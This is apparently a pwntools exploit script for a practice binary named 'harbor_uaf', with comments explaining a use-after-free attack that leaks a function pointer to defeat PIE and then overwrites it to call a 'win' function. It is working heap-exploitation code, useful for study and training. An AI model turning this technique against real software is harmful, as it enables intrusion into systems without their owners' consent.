from pwn import *

context.binary = elf = ELF("/home/kali/Desktop/offsec/prove/1_harbor_uaf/harbor_uaf")
libc = elf.libc 

#SAME OF HARBOR_UAF

# FULL RELRO; CANARY; NX; PIE all enabled

# struct operator with: pointer to function (8 bytes) + char name[56] 
# global var notes, array of strings
# global var current_operator of type operator
# i want to change the action of currenet_operator to win using heap vulns

# can create note, delete, edit (even after free) and show (even after free)
# NO TCACHE POISONING NEEDED. PIE IS ON SO I NEED A LEAK TO USE WIN
#create note 0 -> chunk A
#delete note 0
#hire operator -> same chunk A
#show note 0 -> leak operator->action (addreess of guest_action function)
#edit note 0 -> change 

p = process(elf.path)

p.sendlineafter(b'> ', b'1')                    #create note 0
p.sendlineafter(b'Index:\n', b'0')
p.sendlineafter(b'content:\n', b'dummy')

p.sendlineafter(b'> ', b'3')                    #free note 0
p.sendlineafter(b'Index:\n', b'0')

p.sendlineafter(b'> ', b'5')                    #create operator
p.sendlineafter(b'name:\n', b'bob')

p.sendlineafter(b'> ', b'4')                    #show note 0
p.sendlineafter(b'Index:\n', b'0')
p.recvuntil(b'data:\n')
leak_func_addr = u64(p.recv(8).ljust(8, b'\x00'))

elf_base = leak_func_addr - elf.sym.guest_action
elf.address = elf_base

p.sendlineafter(b'> ', b'2')                    #edit note 0: will write into operator (action)
p.sendlineafter(b'Index:\n', b'0')
p.sendlineafter(b'content:\n', p64(elf.sym.win))

p.sendlineafter(b'>', b'6')                     #call action

p.interactive()
p.close()